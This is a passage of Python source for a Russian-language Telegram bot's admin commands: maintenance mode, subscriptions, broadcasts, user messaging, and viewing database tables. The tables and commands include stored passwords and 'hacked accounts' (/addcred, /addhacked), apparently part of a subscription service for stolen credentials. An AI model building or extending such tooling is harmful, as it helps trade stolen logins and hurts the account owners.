    logger.info(f"/viewdb от {chat_id}")
    access = check_access(chat_id, 'viewdb')
    if access:
        bot.reply_to(message, access, parse_mode='Markdown')
        return
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        types.InlineKeyboardButton("👥 Пользователи", callback_data="db_view_users"),
        types.InlineKeyboardButton("🔐 Пароли", callback_data="db_view_credentials"),
        types.InlineKeyboardButton("💻 Взломанные аккаунты", callback_data="db_view_hacked")
    )
    try:
        bot.reply_to(message, "🔍 *Выберите таблицу для просмотра*:", reply_markup=keyboard, parse_mode='Markdown')
        user = get_user(chat_id)
        if user:
            save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)
    except Exception as e:
        logger.error(f"Ошибка /viewdb: {e}")
        bot.reply_to(message, "❌ *Ошибка выполнения команды!*", parse_mode='Markdown')

# /admin
@bot.message_handler(commands=['admin'])
def admin_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/admin от {chat_id}")
    access = check_access(chat_id, 'admin')
    if access:
        bot.reply_to(message, access, parse_mode='Markdown')
        return
    response = (
        f"🔧 *Панель администратора*\n"
        f"👤 *Ваш статус*: `{get_user(chat_id)['prefix']}`\n\n"
        f"⚙️ *Команды админа*:\n"
        f"🚨 /techstop — Включить техперерыв\n"
        f"✅ /techstopoff — Выключить техперерыв\n"
        f"📢 /broadcast — Отправить рассылку\n"
        f"👑 /adprefix — Выдать подписку\n"
        f"🗑 /delprefix — Сбросить подписку\n"
        f"➕ /adduser — Добавить пользователя\n"
        f"🔐 /addcred — Добавить пароль\n"
        f"💾 /addhacked — Добавить взломанный аккаунт\n"
        f"📞 /messageuser — Связаться с пользователем\n"
        f"🗄 /database — Управление базой\n"
        f"🔍 /viewdb — Просмотр базы\n"
        f"📩 /support — Управление поддержкой\n"
    )
    try:
        bot.reply_to(message, response, parse_mode='Markdown')
        user = get_user(chat_id)
        if user:
            save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)
    except Exception as e:
        logger.error(f"Ошибка /admin: {e}")
        bot.reply_to(message, "❌ *Ошибка выполнения команды!*", parse_mode='Markdown')

# /techstop
@bot.message_handler(commands=['techstop'])
def techstop_cmd(message):
    global tech_mode, tech_reason, tech_end_time
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/techstop от {chat_id}")
    access = check_access(chat_id, 'techstop')
    if access:
        bot.reply_to(message, access, parse_mode='Markdown')
        return
    if tech_mode:
        bot.reply_to(
            message,
            f"🛠 *Техперерыв уже активен!*\n📝 *Причина*: {tech_reason or 'Не указана'}\n🕒 *Окончание*: {format_time(tech_end_time)}",
            parse_mode='Markdown'
        )
        return
    msg = bot.reply_to(
        message,
        "📝 *Введите причину и длительность в часах (через пробел, например: Плановое_обновление 2)*:",
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(msg, process_techstop)
    user = get_user(chat_id)
    if user:
        save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)

def process_techstop(message):
    global tech_mode, tech_reason, tech_end_time
    chat_id = str(message.chat.id)
    logger.info(f"Обработка techstop от {chat_id}")
    try:
        reason, hours = sanitize_input(message.text).split()
        hours = int(hours)
        if hours <= 0:
            bot.reply_to(message, "❌ *Длительность должна быть больше 0!*", parse_mode='Markdown')
            return
        tech_mode = True
        tech_reason = reason.replace('_', ' ')
        tech_end_time = get_current_time() + timedelta(hours=hours)
        response = (
            f"🛠 *Техперерыв включён!*\n"
            f"📝 *Причина*: {tech_reason}\n"
            f"🕒 *Окончание*: {format_time(tech_end_time)}"
        )
        bot.reply_to(message, response, parse_mode='Markdown')
        bot.send_message(
            ADMIN_CHAT_ID,
            f"🚨 *Техперерыв включён*\n📝 *Причина*: {tech_reason}\n🕒 *Окончание*: {format_time(tech_end_time)}\n👤 *Включил*: {chat_id}",
            parse_mode='Markdown'
        )
        for tech_id in get_tech_assistants():
            if tech_id != chat_id:
                try:
                    bot.send_message(
                        tech_id,
                        response,
                        parse_mode='Markdown'
                    )
                except Exception as e:
                    logger.error(f"Ошибка уведомления техпомощника {tech_id}: {e}")
    except ValueError:
        bot.reply_to(message, "❌ *Формат: причина часы!*", parse_mode='Markdown')
    except Exception as e:
        logger.error(f"Ошибка techstop: {e}")
        bot.reply_to(message, "❌ *Ошибка включения!*", parse_mode='Markdown')

# /techstopoff
@bot.message_handler(commands=['techstopoff'])
def techstopoff_cmd(message):
    global tech_mode, tech_reason, tech_end_time
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/techstopoff от {chat_id}")
    access = check_access(chat_id, 'techstopoff')
    if access:
        bot.reply_to(message, access, parse_mode='Markdown')
        return
    if not tech_mode:
        bot.reply_to(message, "✅ *Техперерыв уже отключён!*", parse_mode='Markdown')
        return
    tech_mode = False
    tech_reason = ""
    tech_end_time = None
    response = "✅ *Техперерыв отключён!*"
    try:
        bot.reply_to(message, response, parse_mode='Markdown')
        bot.send_message(
            ADMIN_CHAT_ID,
            f"✅ *Техперерыв отключён*\n👤 *Отключил*: {chat_id}",
            parse_mode='Markdown'
        )
        for tech_id in get_tech_assistants():
            if tech_id != chat_id:
                try:
                    bot.send_message(
                        tech_id,
                        response,
                        parse_mode='Markdown'
                    )
                except Exception as e:
                    logger.error(f"Ошибка уведомления техпомощника {tech_id}: {e}")
        user = get_user(chat_id)
        if user:
            save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)
    except Exception as e:
        logger.error(f"Ошибка /techstopoff: {e}")
        bot.reply_to(message, "❌ *Ошибка отключения!*", parse_mode='Markdown')

# /adprefix
@bot.message_handler(commands=['adprefix'])
def adprefix_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/adprefix от {chat_id}")
    access = check_access(chat_id, 'adprefix')
    if access:
        bot.reply_to(message, access, parse_mode='Markdown')
        return
    msg = bot.reply_to(
        message,
        "📝 *Введите chat_id, префикс и срок подписки в днях (через пробел, например: 123456789 Админ 30)*:",
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(msg, process_adprefix)
    user = get_user(chat_id)
    if user:
        save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)

def process_adprefix(message):
    chat_id = str(message.chat.id)
    logger.info(f"Обработка adprefix от {chat_id}")
    try:
        target_id, prefix, days = sanitize_input(message.text).split()
        days = int(days)
        if days <= 0:
            bot.reply_to(message, "❌ *Срок должен быть больше 0!*", parse_mode='Markdown')
            return
        subscription_end = (get_current_time() + timedelta(days=days)).isoformat()
        save_user(target_id, prefix, subscription_end, target_id, "Неизвестно")
        bot.reply_to(
            message,
            f"✅ *Подписка выдана!*\n🆔 *Chat ID*: `{target_id}`\n🔑 *Префикс*: `{prefix}`\n🕒 *До*: {format_time(subscription_end)}",
            parse_mode='Markdown'
        )
        bot.send_message(
            ADMIN_CHAT_ID,
            f"👑 *Выдана подписка*\n🆔 *Chat ID*: `{target_id}`\n🔑 *Префикс*: `{prefix}`\n🕒 *До*: {format_time(subscription_end)}\n👤 *Выдал*: {chat_id}",
            parse_mode='Markdown'
        )
        try:
            bot.send_message(
                target_id,
                f"🎉 *Вам выдана подписка!*\n🔑 *Статус*: `{prefix}`\n🕒 *До*: {format_time(subscription_end)}",
                parse_mode='Markdown'
            )
        except Exception as e:
            logger.error(f"Ошибка уведомления {target_id}: {e}")
    except ValueError:
        bot.reply_to(message, "❌ *Формат: chat_id префикс дни!*", parse_mode='Markdown')
    except Exception as e:
        logger.error(f"Ошибка adprefix: {e}")
        bot.reply_to(message, "❌ *Ошибка выдачи!*", parse_mode='Markdown')

# /delprefix
@bot.message_handler(commands=['delprefix'])
def delprefix_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/delprefix от {chat_id}")
    access = check_access(chat_id, 'delprefix')
    if access:
        bot.reply_to(message, access, parse_mode='Markdown')
        return
    msg = bot.reply_to(
        message,
        "📝 *Введите chat_id пользователя для сброса подписки*:",
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(msg, process_delprefix)
    user = get_user(chat_id)
    if user:
        save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)

def process_delprefix(message):
    chat_id = str(message.chat.id)
    target_id = sanitize_input(message.text)
    logger.info(f"Сброс подписки для {target_id} от {chat_id}")
    if not target_id:
        bot.reply_to(message, "❌ *Chat ID не может быть пустым!*", parse_mode='Markdown')
        return
    if target_id == ADMIN_CHAT_ID:
        bot.reply_to(message, "❌ *Нельзя сбросить подписку Создателя!*", parse_mode='Markdown')
        return
    user = get_user(target_id)
    if not user:
        bot.reply_to(message, "❌ *Пользователь не найден!*", parse_mode='Markdown')
        return
    try:
        save_user(target_id, "Посетитель", get_current_time().isoformat(), target_id, user['username'])
        bot.reply_to(
            message,
            f"✅ *Подписка сброшена!*\n🆔 *Chat ID*: `{target_id}`\n🔑 *Новый статус*: `Посетитель`",
            parse_mode='Markdown'
        )
        bot.send_message(
            ADMIN_CHAT_ID,
            f"🗑 *Подписка сброшена*\n🆔 *Chat ID*: `{target_id}`\n🔑 *Новый статус*: `Посетитель`\n👤 *Сбросил*: {chat_id}",
            parse_mode='Markdown'
        )
        try:
            bot.send_message(
                target_id,
                f"ℹ️ *Ваша подписка была сброшена.*\n🔑 *Новый статус*: `Посетитель`",
                parse_mode='Markdown'
            )
        except Exception as e:
            logger.error(f"Ошибка уведомления {target_id}: {e}")
    except Exception as e:
        logger.error(f"Ошибка delprefix: {e}")
        bot.reply_to(message, "❌ *Ошибка сброса!*", parse_mode='Markdown')

# /adduser
@bot.message_handler(commands=['adduser'])
def adduser_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/adduser от {chat_id}")
    access = check_access(chat_id, 'adduser')
    if access:
        bot.reply_to(message, access, parse_mode='Markdown')
        return
    msg = bot.reply_to(
        message,
        "📝 *Введите chat_id и префикс (через пробел)*:",
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(msg, process_add_user)
    user = get_user(chat_id)
    if user:
        save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)

# /addcred
@bot.message_handler(commands=['addcred'])
def addcred_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/addcred от {chat_id}")
    access = check_access(chat_id, 'addcred')
    if access:
        bot.reply_to(message, access, parse_mode='Markdown')
        return
    msg = bot.reply_to(message, "📝 *Введите логин*:", parse_mode='Markdown')
    bot.register_next_step_handler(msg, process_add_cred_login)
    user = get_user(chat_id)
    if user:
        save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)

# /addhacked
@bot.message_handler(commands=['addhacked'])
def addhacked_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/addhacked от {chat_id}")
    access = check_access(chat_id, 'addhacked')
    if access:
        bot.reply_to(message, access, parse_mode='Markdown')
        return
    msg = bot.reply_to(message, "📝 *Введите логин для hacked*:", parse_mode='Markdown')
    bot.register_next_step_handler(msg, process_add_hacked_login)
    user = get_user(chat_id)
    if user:
        save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)

# /messageuser
@bot.message_handler(commands=['messageuser'])
def messageuser_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/messageuser от {chat_id}")
    access = check_access(chat_id, 'messageuser')
    if access:
        bot.reply_to(message, access, parse_mode='Markdown')
        return
    msg = bot.reply_to(
        message,
        "📝 *Введите chat_id и сообщение (через пробел, например: 123456789 Привет)*:",
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(msg, process_messageuser)
    user = get_user(chat_id)
    if user:
        save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)

def process_messageuser(message):
    chat_id = str(message.chat.id)
    logger.info(f"Отправка сообщения от {chat_id}")
    try:
        parts = sanitize_input(message.text).split(' ', 1)
        if len(parts) < 2:
            bot.reply_to(message, "❌ *Формат: chat_id сообщение!*", parse_mode='Markdown')
            return
        target_id, text = parts
        bot.send_message(
            target_id,
            f"📩 *Сообщение от админа*:\n{text}",
            parse_mode='Markdown'
        )
        bot.reply_to(
            message,
            f"✅ *Сообщение отправлено пользователю `{target_id}`!*",
            parse_mode='Markdown'
        )
        bot.send_message(
            ADMIN_CHAT_ID,
            f"📞 *Отправлено сообщение*\n🆔 *Кому*: `{target_id}`\n📜 *Текст*: {text}\n👤 *От*: {chat_id}",
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Ошибка messageuser: {e}")
        bot.reply_to(message, "❌ *Ошибка отправки сообщения!*", parse_mode='Markdown')

# /broadcast
@bot.message_handler(commands=['broadcast'])
def broadcast_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/broadcast от {chat_id}")
    access = check_access(chat_id, 'broadcast')
    if access:
        bot.reply_to(message, access, parse_mode='Markdown')
        return
    msg = bot.reply_to(
        message,
        "📢 *Введите сообщение для рассылки всем пользователям*:",
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(msg, process_broadcast)
    user = get_user(chat_id)
    if user:
        save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)

def process_broadcast(message):
    chat_id = str(message.chat.id)
    text = sanitize_input(message.text)
    logger.info(f"Рассылка от {chat_id}")
    if not text:
        bot.reply_to(message, "❌ *Сообщение не может быть пустым!*", parse_mode='Markdown')
        return
    users = get_all_users()
    success_count = 0
    failed_count = 0
    for user_id, _, _ in users:
        if user_id != chat_id and user_id != ADMIN_CHAT_ID:
            try:
                bot.send_message(
                    user_id,
                    f"📢 *Объявление*:\n{text}",
                    parse_mode='Markdown'
                )
                success_count += 1
                time.sleep(0.05)  # Защита от спама
            except Exception as e:
                logger.error(f"Ошибка рассылки {user_id}: {e}")
                failed_count += 1
    bot.reply_to(
        message,
        f"✅ *Рассылка завершена!*\n📩 *Отправлено*: {success_count}\n❌ *Ошибок*: {failed_count}",
        parse_mode='Markdown'
    )
    bot.send_message(
        ADMIN_CHAT_ID,
        f"📢 *Рассылка выполнена*\n📜 *Текст*: {text}\n📩 *Отправлено*: {success_count}\n❌ *Ошибок*: {failed_count}\n👤 *Инициировал*: {chat_id}",
        parse_mode='Markdown'
    )

# Запуск бота и Flask
if __name__ == "__main__":
    logger.info("Запуск бота")
    try:
        init_db()
        threading.Thread(target=keep_alive, daemon=True).start()
        webhook_url = f"{SITE_URL}/webhook"
        bot.remove_webhook()
        time.sleep(0.1)
        bot.set_webhook(url=webhook_url, secret_token=SECRET_WEBHOOK_TOKEN, timeout=30)
        logger.info(f"Вебхук установлен: {webhook_url}")
        app.run(host='0.0.0.0', port=int(os.getenv('PORT', 5000)), debug=False)
    except Exception as e:
        logger.error(f"Ошибка запуска: {e}")
        raise
